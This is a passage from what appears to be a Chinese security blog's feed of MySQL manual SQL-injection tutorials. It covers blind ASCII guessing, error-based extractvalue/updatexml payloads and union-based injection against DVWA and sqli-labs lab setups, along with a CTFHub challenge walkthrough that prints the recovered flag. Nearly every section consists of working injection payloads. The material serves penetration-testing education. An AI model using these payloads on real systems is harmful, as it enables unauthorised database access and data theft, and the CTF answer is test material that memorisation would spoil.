class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),5,1))=95 #</span><br><span class="line">猜解第一个字段名的第六个字符为：i</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),6,1))=105 #</span><br><span class="line">猜解第一个字段名的第七个字符为：d</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),7,1))=100 #</span><br></pre></td></tr></table></figure><p>这里我就不一一截图了，我就只截图<code>最后一个</code>字符为<code>d</code>的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1559.png" alt="图片"></p><p>猜解第二个字段名（first_name）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个字段名的第一个字符为：f</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1,1))=102 #</span><br><span class="line">猜解第二个字段名的第二个字符为：i</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),2,1))=105 #</span><br><span class="line">猜解第二个字段名的第三个字符为：r</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),3,1))=114 #</span><br><span class="line">猜解第二个字段名的第四个字符为：s</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),4,1))=115 #</span><br><span class="line">猜解第二个字段名的第五个字符为：t</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),5,1))=116 #</span><br><span class="line">猜解第二个字段名的第六个字符为：_</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),6,1))=95 #</span><br><span class="line">猜解第二个字段名的第七个字符为：n</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),7,1))=110 #</span><br><span class="line">猜解第二个字段名的第八个字符为：a</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),8,1))=97 #</span><br><span class="line">猜解第二个字段名的第九个字符为：m</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),9,1))=109 #</span><br><span class="line">猜解第二个字段名的第十个字符为：e</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),10,1))=101 #</span><br></pre></td></tr></table></figure><p>这里我就不一一截图了，我只截图<code>最后一个</code>字符<code>e</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1560.png" alt="图片"></p><p>如果想查询第<code>n</code>个字段名，那么就使用这个语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit i,1),n,1))=101 #</span><br><span class="line">注释：</span><br><span class="line">i代表查询第几个字段名</span><br><span class="line">n代码查询字段名的第几个字符</span><br></pre></td></tr></table></figure><h3 id="5、猜解数据"><a href="#5、猜解数据" class="headerlink" title="5、猜解数据"></a>5、猜解数据</h3><p>根据<code>ascii</code>码来猜解数据：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1561.png" alt="图片"></p><p>上帝视角如上图，我们就查询 <code>user</code> 这个字段的数据吧！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解 dvwa.users 表下的 user 列的第一个字段内容为：a</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第二个字段内容为：d</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=100 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第三个字段内容为：m</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=109 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第四个字段内容为：i</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=105 # </span><br><span class="line">猜解 dvwa.users 表下的 user 列的第五个字段内容为：n</span><br><span class="line">1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=110 # </span><br></pre></td></tr></table></figure><p>这里我就不一一截图了，我就截图<code>最后一个</code>字符<code>n</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1562.png" alt="图片"></p><p>这样就猜解出来字段内容为 <code>admin</code>！想要查询下一个就以此类推！</p><p>暴力猜解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解 user 字段值是否为 admin</span><br><span class="line">1&#x27; and (select count(*) from users where user = &#x27;admin&#x27;) = 1 #</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1563.png" alt="图片"></p><p>返回正常说明有 <code>admin</code>！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解 user 字段值是否为 1337</span><br><span class="line">1&#x27; and (select count(*) from users where user = &#x27;1337&#x27;) = 1 #</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1564.png" alt="图片"></p><p>返回正常说明有 <code>1337</code>！这样就能够通过暴力破解(字典)的形式来猜解字段内容！以此类推下去猜解全部的字段内容！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL手注之报错注入</title>
      <link href="/2020/04/18/MySQL-2/"/>
      <url>/2020/04/18/MySQL-2/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入原理详解"><a href="#报错注入原理详解" class="headerlink" title="报错注入原理详解"></a>报错注入原理详解</h2><p>往往在注入过程中根据错误回显进行判断，但是现在非常多的Web程序没有正常的错误回显，这样就需要我们利用报错注入的方式来进行SQL注入了。这篇文章会讲解一下报错注入的产生原理和利用案例。</p><p>当在⼀个聚合函数，⽐如<code>count</code>函数后⾯如果使⽤分组语句就会把查询的⼀部分以错误的形式显⽰出来。 这些函数分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rand() //随机函数 </span><br><span class="line">Floor() //取整函数 </span><br><span class="line">Count() //聚合函数 </span><br><span class="line">Group by key //分组语句</span><br></pre></td></tr></table></figure><p>例如，利⽤<code>floor()</code>语句报错，是利⽤<code>floor()</code>,<code>count()</code>,<code>group() by</code>冲突报错，当这三个函数在特定情况⼀起使⽤产⽣的 错误。</p><p><code>extractvalue</code>注⼊的原理：依旧如同<code>updatexml</code>⼀样，<code>extract</code>的第⼆个参数要求是<code>xpath</code>格式字符串，⽽我们输⼊的并不是。 所以报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数解释： 　　extractvalue()：从⽬标XML中返回包含所查询值的字符串。 　　</span><br><span class="line">EXTRACTVALUE (XML_document, XPath_string); 　　</span><br><span class="line">第⼀个参数：XML_document是String格式，为XML⽂档对象的名称，⽂中为Doc 　　</span><br><span class="line">第⼆个参数：XPath_string (Xpath格式的字符串) 　　</span><br><span class="line">oncat:返回结果为连接参数产⽣的字符串。</span><br></pre></td></tr></table></figure><h3 id="报错注⼊常⽤的函数"><a href="#报错注⼊常⽤的函数" class="headerlink" title="报错注⼊常⽤的函数"></a>报错注⼊常⽤的函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.floor() </span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2.extractvalue() </span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon() </span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon() </span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring() </span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring() </span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp() </span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a>注入实战</h2><p>环境：<code>sqli-labs</code></p><p>注入点：<code>http://127.0.0.1/sqli-labs/Less-17/</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1525.png" alt="图片"></p><p>它的查询语句是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; </span><br></pre></td></tr></table></figure><p>判断用户名是否存在，存在的话那么就重置 <code>$password</code> 的值，这样我们就可以闭合来导致报错注入！</p><h3 id="1、extractvalue-函数获取版本信息"><a href="#1、extractvalue-函数获取版本信息" class="headerlink" title="1、extractvalue() 函数获取版本信息"></a>1、extractvalue() 函数获取版本信息</h3><blockquote><p>注：extractvalue() 函数不支持低版本 mysql</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注入前的payload：</span><br><span class="line">and extractvalue(1,concat(0x7e,(你的注入Payload),0x7e))#</span><br><span class="line">注入后的payload：</span><br><span class="line">and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span><br></pre></td></tr></table></figure><p>我们先抓个包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1526.png" alt="图片"></p><p>这个时候我们就可以吧注入语句放到 <code>passwd=</code> 后面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saul&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1527.png" alt="图片"></p><h3 id="2、数据库名"><a href="#2、数据库名" class="headerlink" title="2、数据库名"></a>2、数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saul&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1528.png" alt="图片"></p><h3 id="3、获取表名"><a href="#3、获取表名" class="headerlink" title="3、获取表名"></a>3、获取表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saul&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1529.png" alt="图片"></p><h3 id="4、获取列名"><a href="#4、获取列名" class="headerlink" title="4、获取列名"></a>4、获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saul&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1530.png" alt="图片"></p><h3 id="5、获取数据"><a href="#5、获取数据" class="headerlink" title="5、获取数据"></a>5、获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saul&#x27; and extractvalue(1,concat(0x7e,(select * from (select username from users limit 0,1) as a),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1531.png" alt="图片"></p><p><code>limit 0,1</code>, 从你的表中的第<code>0</code>个数据开始，只读取一个；想读第二个那么就是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saul&#x27; and extractvalue(1,concat(0x7e,(select * from (select username from users limit 1,1) as a),0x7e))#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1532.png" alt="图片"></p><p>以此类推！</p><p>再来一个 CTF 报错注入的案例！</p><h2 id="ctfhub-报错注入解题"><a href="#ctfhub-报错注入解题" class="headerlink" title="ctfhub-报错注入解题"></a>ctfhub-报错注入解题</h2><p>题目地址：<a href="http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1533.png" alt="图片"></p><h3 id="1、判断注入类型"><a href="#1、判断注入类型" class="headerlink" title="1、判断注入类型"></a>1、判断注入类型</h3><p>加一个单引号报错：数字类型报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1534.png" alt="图片"></p><h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p><code>order by 2</code> 返回正常：说明有 <code>2</code> 列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=1 order by 2</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1535.png" alt="图片"></p><h3 id="3、爆当前数据库名"><a href="#3、爆当前数据库名" class="headerlink" title="3、爆当前数据库名"></a>3、爆当前数据库名</h3><p>用到的函数是 <code>updatexml()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=-1 union select 1,updatexml(1,concat(0x7e,(select database())),1) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1536.png" alt="图片"></p><p>还可以用 <code>extractvalue()</code> 函数也是可以的，而且只需要<code>两个参数</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=-1 union select 1,extractvalue(1,concat(0x7e,(select database()))) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1537.png" alt="图片"></p><p>这个时候得到了当前数据库名为：<code>sqli</code></p><h3 id="4、爆所有表名"><a href="#4、爆所有表名" class="headerlink" title="4、爆所有表名"></a>4、爆所有表名</h3><p>爆所有的表名用到的函数是 <code>group_concat()</code> 函数，这个函数是将查询的数据返回成一个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=-1 union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1538.png" alt="图片"></p><p>这样就得到了两个表名：<code>news</code>，<code>flag</code></p><h3 id="5、爆所有字段名"><a href="#5、爆所有字段名" class="headerlink" title="5、爆所有字段名"></a>5、爆所有字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=-1 union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;))) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1539.png" alt="图片"></p><p>得到了列名只有：<code>flag</code></p><h3 id="6、爆字段内容"><a href="#6、爆字段内容" class="headerlink" title="6、爆字段内容"></a>6、爆字段内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=-1 union select 1,extractvalue(1,concat(0x7e,(select flag from flag))) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1540.png" alt="图片"></p><p>这个时候查询 <code>flag</code> 表名下的 <code>flag</code> 字段内容时候你会发现它爆的不完整！这是为什么呢？</p><p>答：因为使用<code>xpath报错</code>它最多<code>只显示32位字符</code>，也就是我们爆出来的：<code>ctfhub&#123;bd267b79241a7d4d8aae3e61</code> ，所以后面的它没能爆出来！</p><p>这个时候我们就需要用到 <code>mid</code> 函数来进行<code>字符串截取</code>操作来爆出后面的字符串！</p><h4 id="mid-函数语法格式："><a href="#mid-函数语法格式：" class="headerlink" title="mid() 函数语法格式："></a>mid() 函数语法格式：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mid(str,start,[length])</span><br><span class="line">str:截取的字符串</span><br><span class="line">start:起始位置</span><br><span class="line">length:截取的长度，可以忽略</span><br></pre></td></tr></table></figure><p>这个时候加上 <code>mid</code> 函数我们就可以使用这个语句来得到后面的字符串值：<code>4aba1f8913774ff2&#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-0d31b44317053ed4.sandbox.ctfhub.com:10080/?id=-1 union select 1,extractvalue(1,concat(0x7e,mid((select flag from flag),32))) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1541.png" alt="图片"></p><p>最后再拼接起来得到 flag：<code>ctfhub&#123;bd267b79241a7d4d8aae3e614aba1f8913774ff2&#125;</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1542.png" alt="图片"></p><p>至此MySQL手工注入之报错注入就到此为止！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL⼿注之联合查询注⼊</title>
      <link href="/2020/03/23/MySQL-1/"/>
      <url>/2020/03/23/MySQL-1/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL联合查询注入原理"><a href="#MySQL联合查询注入原理" class="headerlink" title="MySQL联合查询注入原理"></a>MySQL联合查询注入原理</h2><p><code>union select</code> 联合查询，即合并（取交集，结果中没有重复⾏）前后两个查询；前提是前后查询视图必须拥有相同数量的列，列也必需拥有相同的数据类型。</p><h2 id="Union联合查询注入基本流程"><a href="#Union联合查询注入基本流程" class="headerlink" title="Union联合查询注入基本流程"></a>Union联合查询注入基本流程</h2><h3 id="1、判断是否存在注入"><a href="#1、判断是否存在注入" class="headerlink" title="1、判断是否存在注入"></a>1、判断是否存在注入</h3><p>方法一：单引号法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入点&#x27;</span><br></pre></td></tr></table></figure><p>方法二：逻辑法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><p>方法三：运算法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">-0</span><br></pre></td></tr></table></figure><h3 id="2、猜解表名"><a href="#2、猜解表名" class="headerlink" title="2、猜解表名"></a>2、猜解表名</h3><p>常见的表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">user</span><br><span class="line">admin_user</span><br><span class="line">system</span><br></pre></td></tr></table></figure><h3 id="3、猜解字段数"><a href="#3、猜解字段数" class="headerlink" title="3、猜解字段数"></a>3、猜解字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by xx</span><br></pre></td></tr></table></figure><h3 id="4、猜解字段名"><a href="#4、猜解字段名" class="headerlink" title="4、猜解字段名"></a>4、猜解字段名</h3><p>常见的字段名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username</span><br><span class="line">password</span><br><span class="line">user</span><br><span class="line">pass</span><br></pre></td></tr></table></figure><h3 id="5、获取数据"><a href="#5、获取数据" class="headerlink" title="5、获取数据"></a>5、获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3... from 表名</span><br></pre></td></tr></table></figure><h2 id="MySQL手注之联合查询注入详解"><a href="#MySQL手注之联合查询注入详解" class="headerlink" title="MySQL手注之联合查询注入详解"></a>MySQL手注之联合查询注入详解</h2><p>测试环境：<code>dvwa</code></p><p>注入点：<a href="http://127.0.0.1/dvwa/vulnerabilities/sqli/">http://127.0.0.1/dvwa/vulnerabilities/sqli/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1515.png" alt="图片"></p><p>靶场注入语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure><h3 id="1、判断是否注入"><a href="#1、判断是否注入" class="headerlink" title="1、判断是否注入"></a>1、判断是否注入</h3><p>我们可以判断是否存在注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断注入语句：</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">这样我们的 and 就逃逸出来了（为了闭合）：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1516.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1 返回正常！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">判断注入语句：</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">这样我们的 and 就逃逸出来了（为了闭合）：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1517.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2 返回不正常说明存在注入！很显然这是一个`字符型`注入！因为它用引号包裹起来了！</span><br></pre></td></tr></table></figure><p>PS：字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><h3 id="2、猜解字段数"><a href="#2、猜解字段数" class="headerlink" title="2、猜解字段数"></a>2、猜解字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注入的语句：</span><br><span class="line">1&#x27; order by 1#</span><br><span class="line">带入进查询就是这样的：</span><br><span class="line">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; order by 1#&#x27;;&quot;;</span><br><span class="line">注释：# 就是注释后面的内容，这样我们的 order by 就逃逸出来了！</span><br></pre></td></tr></table></figure><p>我们先 <code>order by 3</code> 发现错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1518.png" alt="图片"></p><p><code>order by 2</code> 发现正常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1519.png" alt="图片"></p><p>说明字段数有<code>2</code>个！</p><h3 